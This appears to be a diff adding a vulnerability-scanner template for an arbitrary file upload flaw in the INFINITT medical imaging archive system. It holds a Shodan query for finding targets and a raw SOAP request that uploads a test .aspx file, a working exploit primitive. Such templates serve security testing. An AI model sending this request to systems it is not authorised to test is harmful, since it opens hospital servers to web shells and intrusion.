@@ -1,0 +1,43 @@
+id: INFINITT_WebJobUpload_Fileupload
+
+info:
+  name: INFINITT_WebJobUpload_Fileupload
+  author: HK
+  severity: high
+  description: 英飞达医学影像存档与通信系统/webservices/WebJobUpload.asmx接口存在任意文件上传漏洞
+  metadata:
+    max-request: 1
+    shodan-query: body="/webservices/websmartupdatemanager.asmx/"
+    verified: true
+
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /webservices/WebJobUpload.asmx HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+    Accept-Encoding: gzip, deflate
+    Content-Type: text/xml; charset=utf-8
+    Connection: close
+    Content-Length: 413
+
+    <?xml version="1.0" encoding="utf-8"?>
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+    <soap:Body>
+    <jobUpload xmlns="http://rainier">
+    <vcode>test</vcode>
+    <subFolder></subFolder>
+    <fileName>test.aspx</fileName>
+    <bufValue>dGVzdA==</bufValue>
+    </jobUpload>
+    </soap:Body>
+    </soap:Envelope>
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+      - jobUploadResult
